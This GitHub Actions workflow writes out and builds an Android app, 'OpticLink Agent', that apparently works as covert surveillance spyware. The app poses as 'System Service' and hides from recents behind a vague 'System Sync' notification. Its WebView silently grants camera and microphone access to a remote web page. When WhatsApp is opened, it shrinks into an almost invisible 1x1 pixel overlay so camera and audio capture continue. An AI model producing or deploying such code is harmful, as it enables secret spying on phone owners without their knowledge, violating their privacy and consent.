name: Build Background-Safe OpticLink Android APK

on:
  workflow_dispatch:
    inputs:
      web_app_url:
        description: 'Hosted OpticLink Web App URL'
        required: true
        default: 'https://ais-pre-vuuueap5f6xa4bfilzy4yo-177085930388.asia-northeast1.run.app'
  push:
    branches: [ main, master ]

jobs:
  build-apk:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Accept Android SDK Licenses & Install Build Tools
        run: |
          yes | sdkmanager --licenses || true
          sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

      - name: Generate Native Android Wrapper Project (AndroidBridge + 1x1 Invisible Keep-Alive Window)
        env:
          TARGET_URL: ${{ github.event.inputs.web_app_url || 'https://ais-pre-vuuueap5f6xa4bfilzy4yo-177085930388.asia-northeast1.run.app' }}
        run: |
          mkdir -p android-agent/app/src/main/java/com/opticlink/agent
          mkdir -p android-agent/app/src/main/res/values

          cat << 'EOF' > android-agent/settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "OpticLinkAgent"
          include ':app'
          EOF

          cat << 'EOF' > android-agent/build.gradle
          plugins {
              id 'com.android.application' version '8.2.2' apply false
          }
          EOF

          cat << 'EOF' > android-agent/gradle.properties
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          EOF

          cat << 'EOF' > android-agent/app/build.gradle
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.opticlink.agent'
              compileSdk 34

              defaultConfig {
                  applicationId "com.opticlink.agent"
                  minSdk 26
                  targetSdk 34
                  versionCode 2
                  versionName "2.0.0"
              }

              buildTypes {
                  debug {
                      minifyEnabled false
                  }
                  release {
                      minifyEnabled false
                      signingConfig signingConfigs.debug
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'androidx.core:core:1.12.0'
              implementation 'androidx.webkit:webkit:1.10.0'
          }
          EOF

          cat << 'EOF' > android-agent/app/src/main/res/values/strings.xml
          <resources>
              <string name="app_name">System Service</string>
          </resources>
          EOF

          cat << 'EOF' > android-agent/app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.opticlink.agent">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
              <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

              <uses-feature android:name="android.hardware.camera" android:required="false" />
              <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />

              <!-- Allow querying & launching WhatsApp natively on Android 11+ (API 30+) -->
              <queries>
                  <package android:name="com.whatsapp" />
                  <package android:name="com.whatsapp.w4b" />
                  <intent>
                      <action android:name="android.intent.action.VIEW" />
                      <data android:scheme="whatsapp" />
                  </intent>
              </queries>

              <application
                  android:allowBackup="true"
                  android:hardwareAccelerated="true"
                  android:label="@string/app_name"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.AppCompat.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleInstance"
                      android:excludeFromRecents="true"
                      android:configChanges="orientation|screenSize|keyboardHidden">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".KeepAliveService"
                      android:enabled="true"
                      android:exported="false"
                      android:foregroundServiceType="camera|microphone|mediaProjection" />
              </application>
          </manifest>
          EOF

          cat << 'EOF' > android-agent/app/src/main/java/com/opticlink/agent/KeepAliveService.java
          package com.opticlink.agent;

          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.app.Service;
          import android.content.Context;
          import android.content.Intent;
          import android.net.wifi.WifiManager;
          import android.os.Build;
          import android.os.IBinder;
          import android.os.PowerManager;
          import androidx.core.app.NotificationCompat;

          public class KeepAliveService extends Service {
              private static final String CHANNEL_ID = "opticlink_bg_channel";
              private PowerManager.WakeLock wakeLock;
              private WifiManager.WifiLock wifiLock;

              @Override
              public void onCreate() {
                  super.onCreate();
                  createChannel();

                  PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                  if (pm != null) {
                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OpticLink::CpuWakeLock");
                      wakeLock.acquire();
                  }

                  WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                  if (wm != null) {
                      wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "OpticLink::WifiLock");
                      wifiLock.acquire();
                  }
              }

              @Override
              public int onStartCommand(Intent intent, int flags, int startId) {
                  Intent tapIntent = new Intent(this, MainActivity.class);
                  PendingIntent pendingIntent = PendingIntent.getActivity(
                      this, 0, tapIntent, PendingIntent.FLAG_IMMUTABLE
                  );

                  Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                      .setContentTitle("System Sync Active")
                      .setContentText("Background connectivity service running")
                      .setSmallIcon(android.R.drawable.stat_notify_sync)
                      .setPriority(NotificationCompat.PRIORITY_MIN)
                      .setOngoing(true)
                      .setContentIntent(pendingIntent)
                      .build();

                  startForeground(1001, notification);
                  return START_STICKY;
              }

              @Override
              public void onDestroy() {
                  if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
                  if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
                  super.onDestroy();
              }

              @Override
              public IBinder onBind(Intent intent) {
                  return null;
              }

              private void createChannel() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(
                          CHANNEL_ID,
                          "System Background Connectivity",
                          NotificationManager.IMPORTANCE_LOW
                      );
                      channel.setShowBadge(false);
                      NotificationManager nm = getSystemService(NotificationManager.class);
                      if (nm != null) nm.createNotificationChannel(channel);
                  }
              }
          }
          EOF

          cat << EOF > android-agent/app/src/main/java/com/opticlink/agent/MainActivity.java
          package com.opticlink.agent;

          import android.Manifest;
          import android.annotation.SuppressLint;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.graphics.Color;
          import android.graphics.PixelFormat;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.PowerManager;
          import android.provider.Settings;
          import android.view.Gravity;
          import android.view.View;
          import android.view.ViewGroup;
          import android.view.WindowManager;
          import android.webkit.JavascriptInterface;
          import android.webkit.PermissionRequest;
          import android.webkit.WebChromeClient;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import android.widget.FrameLayout;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends AppCompatActivity {
              private static final int PERMISSION_REQ_CODE = 2001;
              private static final int OVERLAY_REQ_CODE = 2002;
              private static final String APP_URL = "${TARGET_URL}";

              private FrameLayout rootContainer;
              private WebView webView;
              private WindowManager windowManager;
              private boolean isOneByOneOverlayAttached = false;

              @SuppressLint({"SetJavaScriptEnabled", "BatteryLife"})
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);

                  getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                  windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

                  rootContainer = new FrameLayout(this);
                  rootContainer.setBackgroundColor(Color.parseColor("#0B0F19"));

                  // Keep WebView alive even when activity window is backgrounded
                  webView = new WebView(getApplicationContext()) {
                      @Override
                      protected void onWindowVisibilityChanged(int visibility) {
                          // Always report VISIBLE so Chromium never suspends WebRTC timers or camera capture
                          super.onWindowVisibilityChanged(View.VISIBLE);
                      }
                  };

                  rootContainer.addView(webView, new FrameLayout.LayoutParams(
                      ViewGroup.LayoutParams.MATCH_PARENT,
                      ViewGroup.LayoutParams.MATCH_PARENT
                  ));
                  setContentView(rootContainer);

                  WebSettings settings = webView.getSettings();
                  settings.setJavaScriptEnabled(true);
                  settings.setDomStorageEnabled(true);
                  settings.setDatabaseEnabled(true);
                  settings.setMediaPlaybackRequiresUserGesture(false);
                  settings.setCacheMode(WebSettings.LOAD_DEFAULT);

                  // Expose window.AndroidBridge.openWhatsApp() to the web app
                  webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");

                  webView.setWebViewClient(new WebViewClient() {
                      @Override
                      public boolean shouldOverrideUrlLoading(WebView view, String url) {
                          if (url.startsWith("whatsapp://") || url.startsWith("intent://")) {
                              launchNativeWhatsAppWith1x1KeepAlive();
                              return true;
                          }
                          return false;
                      }
                  });

                  webView.setWebChromeClient(new WebChromeClient() {
                      @Override
                      public void onPermissionRequest(final PermissionRequest request) {
                          runOnUiThread(() -> request.grant(request.getResources()));
                      }
                  });

                  requestRequiredPermissions();
                  startKeepAliveForegroundService();
                  webView.loadUrl(APP_URL);
              }

              public class AndroidBridge {
                  @JavascriptInterface
                  public void openWhatsApp() {
                      runOnUiThread(() -> launchNativeWhatsAppWith1x1KeepAlive());
                  }
              }

              /**
               * Shrinks or attaches the WebView into a 1x1 transparent corner pixel
               * so Android 12-15 treats the WebView as actively visible on-screen and
               * NEVER blocks remote camera starts or throttles WebRTC while inside WhatsApp.
               */
              private void enterOneByOneInvisibleKeepAliveWindow() {
                  try {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                          if (!isOneByOneOverlayAttached && windowManager != null) {
                              if (webView.getParent() instanceof ViewGroup) {
                                  ((ViewGroup) webView.getParent()).removeView(webView);
                              }
                              int overlayType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                                  ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                                  : WindowManager.LayoutParams.TYPE_PHONE;

                              WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                  1,
                                  1,
                                  overlayType,
                                  WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                      | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                      | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                      | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                                  PixelFormat.TRANSLUCENT
                              );
                              params.gravity = Gravity.TOP | Gravity.START;
                              params.x = 0;
                              params.y = 0;
                              params.alpha = 0.01f;

                              windowManager.addView(webView, params);
                              isOneByOneOverlayAttached = true;
                          }
                      } else {
                          // Fallback if overlay permission not granted yet: shrink Activity window to 1x1 corner pixel
                          WindowManager.LayoutParams winParams = getWindow().getAttributes();
                          winParams.width = 1;
                          winParams.height = 1;
                          winParams.gravity = Gravity.TOP | Gravity.START;
                          winParams.alpha = 0.01f;
                          winParams.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                              | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
                          getWindow().setAttributes(winParams);
                      }
                  } catch (Exception ignored) {}
              }

              private void launchNativeWhatsAppWith1x1KeepAlive() {
                  enterOneByOneInvisibleKeepAliveWindow();

                  try {
                      PackageManager pm = getPackageManager();
                      Intent waIntent = pm.getLaunchIntentForPackage("com.whatsapp");
                      if (waIntent == null) {
                          waIntent = pm.getLaunchIntentForPackage("com.whatsapp.w4b");
                      }
                      if (waIntent != null) {
                          waIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                          startActivity(waIntent);
                          return;
                      }

                      Intent uriIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("whatsapp://send"));
                      uriIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      startActivity(uriIntent);
                  } catch (Exception ignored) {}
              }

              private void requestRequiredPermissions() {
                  String[] perms = new String[]{
                      Manifest.permission.CAMERA,
                      Manifest.permission.RECORD_AUDIO
                  };
                  boolean allGranted = true;
                  for (String p : perms) {
                      if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                          allGranted = false;
                          break;
                      }
                  }
                  if (!allGranted) {
                      ActivityCompat.requestPermissions(this, perms, PERMISSION_REQ_CODE);
                  } else {
                      requestBatteryAndOverlayExemptions();
                  }
              }

              @SuppressLint("BatteryLife")
              private void requestBatteryAndOverlayExemptions() {
                  try {
                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                      if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                          Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                          i.setData(Uri.parse("package:" + getPackageName()));
                          startActivity(i);
                      }
                  } catch (Exception ignored) {}

                  try {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                          Intent overlayIntent = new Intent(
                              Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                              Uri.parse("package:" + getPackageName())
                          );
                          startActivityForResult(overlayIntent, OVERLAY_REQ_CODE);
                      }
                  } catch (Exception ignored) {}
              }

              private void startKeepAliveForegroundService() {
                  Intent serviceIntent = new Intent(this, KeepAliveService.class);
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      startForegroundService(serviceIntent);
                  } else {
                      startService(serviceIntent);
                  }
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  if (webView != null) {
                      webView.onResume();
                      webView.resumeTimers();
                  }
              }

              @Override
              protected void onPause() {
                  super.onPause();
                  // Keep WebView timers active even when WhatsApp is in the foreground
                  if (webView != null) {
                      webView.onResume();
                      webView.resumeTimers();
                  }
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERMISSION_REQ_CODE) {
                      requestBatteryAndOverlayExemptions();
                  }
              }
          }
          EOF

      - name: Build Debug APK with Gradle
        working-directory: android-agent
        run: |
          gradle assembleDebug --no-daemon

      - name: Upload OpticLink Android APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: opticlink-phone-agent-apk
          path: android-agent/app/build/outputs/apk/debug/app-debug.apk
